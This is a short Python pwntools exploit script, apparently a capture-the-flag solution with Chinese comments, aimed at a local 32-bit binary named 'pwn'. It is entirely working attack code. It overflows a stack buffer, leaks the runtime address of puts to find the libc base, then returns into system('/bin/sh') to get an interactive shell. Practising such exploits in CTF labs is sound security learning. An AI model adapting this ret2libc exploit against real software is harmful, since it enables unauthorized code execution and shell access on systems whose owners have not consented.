from pwn import *
from LibcSearcher import *

context(arch='i386', os='linux')

p = process('./pwn')
libc = ELF('./libc.so.6')
elf = ELF('./pwn')
# 第一轮：泄露puts地址
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']
padding = 0x48+0x04
payload = b'A'* padding
payload += p32(puts_plt) + p32(main_addr) + p32(puts_got)
p.sendlineafter(b"Input: ", payload)

leaked_puts = u32(p.recv(4))
#libc = LibcSearcher('puts', leaked_puts)
#libc_base = leaked_puts - libc.dump('puts')
#system = libc_base + libc.dump('system')
#bin_sh = libc_base + libc.dump('str_bin_sh')
libc_base = leaked_puts - libc.sym['puts']
system_add = libc_base + libc.sym['system']
binsh_add = libc_base + next(libc.search(b'/bin/sh'))
# 第二轮：获取shell
payload = b'A'* padding + p32(system_add) + p32(0xdeadbeef) + p32(binsh_add)
p.sendlineafter(b"Input: ", payload)
p.interactive()
